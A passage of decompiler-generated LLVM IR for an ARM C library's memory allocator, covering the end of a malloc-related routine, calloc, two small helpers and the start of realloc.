dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13ba4
  %v0_13bdc = load i32, i32* @r8, align 4
  %v1_13bdc = add i32 %v0_13bdc, -12
  %v1_13be0 = and i32 %v1_13bdc, -8
  store i32 %v3_139a8, i32* %ip.global-to-local, align 4
  %v2_13be8 = add i32 %v1_13be0, %v3_139a8
  store i32 %v2_13be8, i32* %r1.global-to-local, align 4
  %v2_13bec = icmp ugt i32 %v1_13be0, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_13bf4 = or i32 %v1_13be0, 1
  store i32 %v1_13bf4, i32* %r3.global-to-local, align 4
  store i32 %v1_13bf4, i32* %v2_139b4, align 4
  %v0_13bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_13bfc = load i32, i32* %r1.global-to-local, align 4
  %v2_13bfc = add i32 %v1_13bfc, 8
  %v3_13bfc = inttoptr i32 %v2_13bfc to i32*
  store i32 %v0_13bfc, i32* %v3_13bfc, align 4
  %v0_13c00 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c00 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c00 = add i32 %v1_13c00, 4
  %v3_13c00 = inttoptr i32 %v2_13c00 to i32*
  store i32 %v0_13c00, i32* %v3_13c00, align 4
  br i1 %v2_13bec, label %dec_label_pc_13c08, label %dec_label_pc_13c20

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13bd8
  %v0_13c08 = load i32, i32* @r6, align 4
  %v1_13c08 = add i32 %v0_13c08, 836
  %v2_13c08 = inttoptr i32 %v1_13c08 to i32*
  %v3_13c08 = load i32, i32* %v2_13c08, align 4
  store i32 %v3_13c08, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13c10 = load i32, i32* %ip.global-to-local, align 4
  %v1_13c10 = add i32 %v0_13c10, 8
  store i32 %v1_13c10, i32* @r0, align 4
  store i32 -1, i32* %v2_13c08, align 4
  %v0_13c18 = call i32 @free()
  store i32 %v0_13c18, i32* %r0.global-to-local, align 4
  %v0_13c1c = load i32, i32* @r4, align 4
  %v1_13c1c = load i32, i32* @r6, align 4
  %v2_13c1c = add i32 %v1_13c1c, 836
  %v3_13c1c = inttoptr i32 %v2_13c1c to i32*
  store i32 %v0_13c1c, i32* %v3_13c1c, align 4
  br label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %.thread37, %dec_label_pc_13bd8, %dec_label_pc_13ba4, %dec_label_pc_13b9c, %dec_label_pc_13c08
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r0.global-to-local, align 4
  %v4_13c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13c28, i32* %lr.global-to-local, align 4
  %v1_13c2c = add i32 %v4_13c28, 872
  store i32 %v1_13c2c, i32* %r1.global-to-local, align 4
  %v1_13c30 = inttoptr i32 %v1_13c2c to i32*
  %v2_13c30 = load i32, i32* %v1_13c30, align 4
  store i32 %v2_13c30, i32* %r1.global-to-local, align 4
  %v3_13c30 = add i32 %v4_13c28, 876
  %v4_13c30 = inttoptr i32 %v3_13c30 to i32*
  %v5_13c30 = load i32, i32* %v4_13c30, align 4
  store i32 %v5_13c30, i32* %r3.global-to-local, align 4
  %v1_13c38 = add i32 %v4_13c28, 868
  %v2_13c38 = inttoptr i32 %v1_13c38 to i32*
  %v3_13c38 = load i32, i32* %v2_13c38, align 4
  store i32 %v3_13c38, i32* %r3.global-to-local, align 4
  %v1_13c3c = add i32 %v4_13c28, 884
  %v2_13c3c = inttoptr i32 %v1_13c3c to i32*
  %v3_13c3c = load i32, i32* %v2_13c3c, align 4
  store i32 %v3_13c3c, i32* %r2.global-to-local, align 4
  %v2_13c40 = add i32 %v3_13c38, %v2_13c30
  store i32 %v2_13c40, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_13c30, %v5_13c30
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_13c20
  store i32 %v2_13c30, i32* %v4_13c30, align 4
  %v0_13c48.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13c48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_13c20, %bb168
  %v1_13c48 = phi i32 [ %v3_13c3c, %dec_label_pc_13c20 ], [ %v1_13c48.pre, %bb168 ]
  %v4_13c4c = phi i32 [ %v2_13c40, %dec_label_pc_13c20 ], [ %v0_13c48.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_13c4c, %v1_13c48
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_13c4c = load i32, i32* %lr.global-to-local, align 4
  %v6_13c4c = add i32 %v5_13c4c, 884
  %v7_13c4c = inttoptr i32 %v6_13c4c to i32*
  store i32 %v4_13c4c, i32* %v7_13c4c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_13c50 = load i32, i32* %lr.global-to-local, align 4
  %v1_13c50 = add i32 %v0_13c50, 44
  %v2_13c50 = inttoptr i32 %v1_13c50 to i32*
  %v3_13c50 = load i32, i32* %v2_13c50, align 4
  store i32 %v3_13c50, i32* %ip.global-to-local, align 4
  %v1_13c54 = add i32 %v3_13c50, 4
  %v2_13c54 = inttoptr i32 %v1_13c54 to i32*
  %v3_13c54 = load i32, i32* %v2_13c54, align 4
  store i32 %v1_13868, i32* %r1.global-to-local, align 4
  %v1_13c5c = and i32 %v3_13c54, -4
  store i32 %v1_13c5c, i32* %r3.global-to-local, align 4
  %v3_13c60 = icmp ult i32 %v1_13c5c, %v1_13868
  br i1 %v3_13c60, label %dec_label_pc_13c8c, label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %bb171
  %v0_13c68 = load i32, i32* @sl, align 4
  %v2_13c68 = sub i32 %v1_13c5c, %v0_13c68
  %v2_13c6c = add i32 %v0_13c68, %v3_13c50
  store i32 %v2_13c6c, i32* %r1.global-to-local, align 4
  %v1_13c70 = or i32 %v2_13c68, 1
  store i32 %v1_13c70, i32* %r3.global-to-local, align 4
  %v1_13c74 = or i32 %v0_13c68, 1
  store i32 %v1_13c74, i32* %r2.global-to-local, align 4
  %v1_13c78 = add i32 %v3_13c50, 8
  store i32 %v1_13c78, i32* %r0.global-to-local, align 4
  store i32 %v1_13c74, i32* %v2_13c54, align 4
  %v0_13c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c80 = load i32, i32* %lr.global-to-local, align 4
  %v2_13c80 = add i32 %v1_13c80, 44
  %v3_13c80 = inttoptr i32 %v2_13c80 to i32*
  store i32 %v0_13c80, i32* %v3_13c80, align 4
  %v0_13c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c84 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c84 = add i32 %v1_13c84, 4
  %v3_13c84 = inttoptr i32 %v2_13c84 to i32*
  store i32 %v0_13c84, i32* %v3_13c84, align 4
  br label %dec_label_pc_13ca4

dec_label_pc_13c8c:                               ; preds = %bb160, %bb171, %dec_label_pc_13a68
  store i32 63284, i32* %r3.global-to-local, align 4
  %v0_13c90 = call i32 @__aeabi_read_tp()
  %v3_13c94 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13c94 = sext i16 %v3_13c94 to i32
  store i32 %v4_13c94, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13c9c = add i32 %v4_13c94, %v0_13c90
  %v4_13c9c = inttoptr i32 %v3_13c9c to i32*
  store i32 12, i32* %v4_13c9c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ca4

dec_label_pc_13ca4:                               ; preds = %bb154, %bb153, %dec_label_pc_13c68, %dec_label_pc_138b0, %dec_label_pc_13c8c
  %v0_13ca4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13ca4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %.thread4, %dec_label_pc_1387c, %.thread124, %dec_label_pc_136ec, %dec_label_pc_136e0, %dec_label_pc_13548, %dec_label_pc_134cc, %dec_label_pc_13ca4
  store i32 %v2_133ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v4_13cb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 44) to i32*), align 4
  store i32 %v4_13cb8, i32* @ip, align 4
  store i32 81092, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13cb8)
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13424, %dec_label_pc_13ca8
  %v0_13cc4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13cc4, i32* %r0.global-to-local, align 4
  store i32 %v3_133c0, i32* @r4, align 4
  store i32 %v6_133c0, i32* @r5, align 4
  store i32 %v9_133c0, i32* @r6, align 4
  store i32 %v12_133c0, i32* @r7, align 4
  store i32 %v15_133c0, i32* @r8, align 4
  store i32 %v18_133c0, i32* @sb, align 4
  store i32 %v21_133c0, i32* @sl, align 4
  store i32 %v24_133c0, i32* @fp, align 4
  store i32 %v27_133c0, i32* @lr, align 4
  ret i32 %v0_13cc4

; uselistorder directives
  uselistorder i32 %v0_13c68, { 1, 0, 2 }
  uselistorder i32 %v3_13c50, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c4c, { 1, 0 }
  uselistorder i32 %v2_13c30, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13c28, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13be0, { 1, 2, 0 }
  uselistorder i32 %v0_13ba8, { 1, 0 }
  uselistorder i32 %v0_13b9c, { 1, 0 }
  uselistorder i32 %v2_13b8c, { 1, 0 }
  uselistorder i32 %v2_13b1c, { 2, 1, 0 }
  uselistorder i32 %v2_13b04, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13afc, { 1, 0, 2 }
  uselistorder i32 %v1_13af8, { 2, 1, 0 }
  uselistorder i32 %v0_13af8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_13adc, { 1, 0 }
  uselistorder i32 %v2_13ab4, { 1, 0 }
  uselistorder i32 %v3_13aa8, { 1, 0, 2 }
  uselistorder i32 %v2_13a88, { 1, 0, 2 }
  uselistorder i32* %v2_13a80, { 1, 0, 2 }
  uselistorder i32 %v0_13a68, { 1, 0 }
  uselistorder i32 %v6_13a44, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13a30, { 2, 1, 0 }
  uselistorder i32 %v0_13a18, { 1, 0 }
  uselistorder i32 %v2_139d4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_139d0, { 1, 0 }
  uselistorder i32 %v3_139a8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_13988, { 1, 0, 2 }
  uselistorder i32 %v2_13970, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13918, { 2, 1, 0 }
  uselistorder i32 %v6_1390c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_138e8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_138a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13868, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_13860, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1385c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_13848, { 1, 0 }
  uselistorder i32 %v7_13808, { 1, 0 }
  uselistorder i32 %v4_13808, { 1, 0 }
  uselistorder i32 %v0_137d8, { 1, 0 }
  uselistorder i32 %v2_137ac, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_137a857, { 1, 0 }
  uselistorder i32 %v1_13774, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1375c., { 1, 2, 0 }
  uselistorder i32 %v0_13764, { 0, 1, 3, 2 }
  uselistorder i32 %v1_13764, { 1, 0 }
  uselistorder i32 %v3_13744, { 1, 0 }
  uselistorder i32 %v4_13740, { 1, 0, 2 }
  uselistorder i32 %v1_136b0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13708, { 1, 0 }
  uselistorder i32 %v1_136ec, { 1, 0 }
  uselistorder i32 %v1_1358c, { 1, 0 }
  uselistorder i32 %v0_136cc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_13694, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13728.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13670, { 2, 1, 0 }
  uselistorder i32 %v3_13664, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_13584, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1362c, { 1, 0 }
  uselistorder i32 %v3_13620, { 1, 0 }
  uselistorder i32 %v0_1362c, { 1, 0 }
  uselistorder i32 %v3_13604, { 0, 2, 3, 1 }
  uselistorder i32 %v2_135f4, { 1, 0, 2 }
  uselistorder i32 %v3_135ac, { 2, 1, 0 }
  uselistorder i32 %v0_1359c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1356c, { 1, 0 }
  uselistorder i32 %v1_13520, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1351c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_134c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_134b4, { 1, 0 }
  uselistorder i32 %v3_13484, { 1, 0 }
  uselistorder i32 %v0_13478, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13458, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1344c, { 1, 0 }
  uselistorder i32 %v0_1341c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 110, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_13cc4, { 1, 0 }
  uselistorder label %dec_label_pc_13ca8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13ca4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13c8c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_13c20, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_13b9c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13b94, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13a68, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_1399c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_13854, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_137a8, { 1, 0 }
  uselistorder label %dec_label_pc_137b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13774, { 1, 0 }
  uselistorder label %dec_label_pc_13728, { 1, 0 }
  uselistorder label %dec_label_pc_136bc, { 1, 0 }
  uselistorder label %dec_label_pc_136b8, { 1, 0 }
  uselistorder label %dec_label_pc_13664, { 1, 0 }
  uselistorder label %dec_label_pc_13650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13618, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13604, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_13cd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13cd8:
  %v0_13cd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13cd8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13cd8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13cd8, %bb
  %v4_13cf4 = phi i32 [ %arg1, %dec_label_pc_13cd8 ], [ 0, %bb ]
  ret i32 %v4_13cf4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_13cf8 = load i32, i32* @r4, align 4
  %v6_13cf8 = load i32, i32* @r5, align 4
  %v9_13cf8 = load i32, i32* @r6, align 4
  %v12_13cf8 = load i32, i32* @lr, align 4
  %v2_13d00 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_13d10 = mul i32 %arg2, %arg1
  store i32 %v2_13d10, i32* @r6, align 4
  br i1 %v2_13d00, label %dec_label_pc_13d48, label %dec_label_pc_13d18

dec_label_pc_13d18:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_13d20 = udiv i32 %v2_13d10, %arg1
  %v9_13d24 = icmp eq i32 %v2_13d20, %arg2
  br i1 %v9_13d24, label %dec_label_pc_13d48, label %dec_label_pc_13d2c

dec_label_pc_13d2c:                               ; preds = %dec_label_pc_13d18
  %v0_13d30 = call i32 @__aeabi_read_tp()
  %v3_13d34 = load i16, i16* @global_var_233d0.483, align 2
  %v4_13d34 = sext i16 %v3_13d34 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13d40 = add i32 %v4_13d34, %v0_13d30
  %v4_13d40 = inttoptr i32 %v3_13d40 to i32*
  store i32 12, i32* %v4_13d40, align 4
  br label %dec_label_pc_13e0c

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d18, %entry
  %v4_13d4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 108) to i32*), align 4
  store i32 %v4_13d4c, i32* @r4, align 4
  %v4_13d64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  store i32 %v4_13d64, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13d64)
  %v0_13d78 = load i32, i32* @r5, align 4
  %v2_13d78 = add i32 %v0_13d78, 16
  %v3_13d78 = inttoptr i32 %v2_13d78 to i32*
  %v4_13d78 = load i32, i32* %v3_13d78, align 4
  store i32 %v4_13d78, i32* %ip.global-to-local, align 4
  store i32 81284, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13d78)
  %v0_13d84 = load i32, i32* @r6, align 4
  store i32 %v0_13d84, i32* @r0, align 4
  %v0_13d88 = call i32 @malloc()
  store i32 %v0_13d88, i32* %r4.global-to-local, align 4
  %v2_13d8c = icmp eq i32 %v0_13d88, 0
  br i1 %v2_13d8c, label %.thread, label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13d48
  %v1_13d94 = add i32 %v0_13d88, -4
  %v2_13d94 = inttoptr i32 %v1_13d94 to i32*
  %v3_13d94 = load i32, i32* %v2_13d94, align 4
  %v1_13d98 = and i32 %v3_13d94, 2
  %v2_13d98 = icmp eq i32 %v1_13d98, 0
  br i1 %v2_13d98, label %dec_label_pc_13da0, label %.thread

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d94
  %v1_13da06 = add i32 %v3_13d94, -4
  %v1_13da4 = and i32 %v1_13da06, -4
  %v3_13da8 = udiv i32 %v1_13da4, 4
  store i32 %v3_13da8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_13da4, 36
  %v2_13db0 = icmp ult i32 %v1_13da4, 33
  %v3_13db0 = or i1 %tmp, %v2_13db0
  br i1 %v3_13db0, label %dec_label_pc_13dbc, label %dec_label_pc_13db4

dec_label_pc_13db4:                               ; preds = %dec_label_pc_13da0
  %v3_13db4 = inttoptr i32 %v0_13d88 to i8*
  %v4_13db4 = call i32 @__GI_memset(i8* %v3_13db4, i32 0, i32 %v1_13da4)
  br label %.thread

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13da0
  %tmp7 = icmp eq i32 %v1_13da4, 16
  %v2_13dc0 = inttoptr i32 %v0_13d88 to i32*
  store i32 0, i32* %v2_13dc0, align 4
  %v1_13dc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dc4 = add i32 %v1_13dc4, 4
  %v3_13dc4 = inttoptr i32 %v2_13dc4 to i32*
  store i32 0, i32* %v3_13dc4, align 4
  %v1_13dc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dc8 = add i32 %v1_13dc8, 8
  %v3_13dc8 = inttoptr i32 %v2_13dc8 to i32*
  store i32 0, i32* %v3_13dc8, align 4
  %v2_13dcc = icmp ult i32 %v1_13da4, 13
  %v3_13dcc = or i1 %tmp7, %v2_13dcc
  br i1 %v3_13dcc, label %.thread, label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dbc
  %v0_13dd0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13dd4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dd4 = add i32 %v1_13dd4, 12
  %v3_13dd4 = inttoptr i32 %v2_13dd4 to i32*
  store i32 0, i32* %v3_13dd4, align 4
  %v1_13dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dd8 = add i32 %v1_13dd8, 16
  %v3_13dd8 = inttoptr i32 %v2_13dd8 to i32*
  store i32 0, i32* %v3_13dd8, align 4
  %tmp8 = icmp ult i32 %v0_13dd0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd0
  %v0_13de0 = load i32, i32* %ip.global-to-local, align 4
  %v7_13de0 = icmp eq i32 %v0_13de0, 9
  %v1_13de4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13de4 = add i32 %v1_13de4, 20
  %v3_13de4 = inttoptr i32 %v2_13de4 to i32*
  store i32 0, i32* %v3_13de4, align 4
  %v1_13de8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13de8 = add i32 %v1_13de8, 24
  %v3_13de8 = inttoptr i32 %v2_13de8 to i32*
  store i32 0, i32* %v3_13de8, align 4
  br i1 %v7_13de0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13de0
  %v2_13dec = load i32, i32* %r4.global-to-local, align 4
  %v3_13dec = add i32 %v2_13dec, 32
  %v4_13dec = inttoptr i32 %v3_13dec to i32*
  store i32 0, i32* %v4_13dec, align 4
  %v2_13df0 = load i32, i32* %r4.global-to-local, align 4
  %v3_13df0 = add i32 %v2_13df0, 28
  %v4_13df0 = inttoptr i32 %v3_13df0 to i32*
  store i32 0, i32* %v4_13df0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13de0, %dec_label_pc_13d94, %dec_label_pc_13dd0, %dec_label_pc_13dbc, %dec_label_pc_13d48, %dec_label_pc_13db4, %bb
  store i32 1, i32* @r1, align 4
  %v0_13e00 = load i32, i32* @r5, align 4
  %v2_13e00 = add i32 %v0_13e00, 44
  %v3_13e00 = inttoptr i32 %v2_13e00 to i32*
  %v4_13e00 = load i32, i32* %v3_13e00, align 4
  store i32 %v4_13e00, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13e00)
  br label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13d2c, %.thread
  %v0_13e0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_13cf8, i32* @r4, align 4
  store i32 %v6_13cf8, i32* @r5, align 4
  store i32 %v9_13cf8, i32* @r6, align 4
  store i32 %v12_13cf8, i32* @lr, align 4
  ret i32 %v0_13e0c

; uselistorder directives
  uselistorder i32 %v1_13da4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_13d88, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 2, 7, 3, 8, 4, 9, 5, 10, 11, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13e0c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_13e24(i32 %arg1) local_unnamed_addr {
dec_label_pc_13e24:
  %v0_13e24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13e24, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13e24
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13e24, %bb
  %v4_13e34 = phi i32 [ %arg1, %dec_label_pc_13e24 ], [ 0, %bb ]
  ret i32 %v4_13e34

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13e38 = load i32, i32* @r4, align 4
  %v6_13e38 = load i32, i32* @r5, align 4
  %v9_13e38 = load i32, i32* @r6, align 4
  %v12_13e38 = load i32, i32* @r7, align 4
  %v15_13e38 = load i32, i32* @r8, align 4
  %v18_13e38 = load i32, i32* @sb, align 4
  %v21_13e38 = load i32, i32* @sl, align 4
  %v24_13e38 = load i32, i32* @fp, align 4
  %v27_13e38 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13e44 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13e44, label %dec_label_pc_13e58, label %dec_label_pc_13e68

dec_label_pc_13e58:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_13e5c = call i32 @malloc()
  store i32 %v0_13e5c, i32* %r0.global-to-local, align 4
  store i32 %v0_13e5c, i32* @r4, align 4
  br label %dec_label_pc_141c8

dec_label_pc_13e68:                               ; preds = %entry
  %v2_13e68 = icmp eq i32 %arg2, 0
  br i1 %v2_13e68, label %dec_label_pc_13e70, label %dec_label_pc_13e7c

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e68
  %v0_13e70 = call i32 @free()
  store i32 %v0_13e70, i32* %r0.global-to-local, align 4
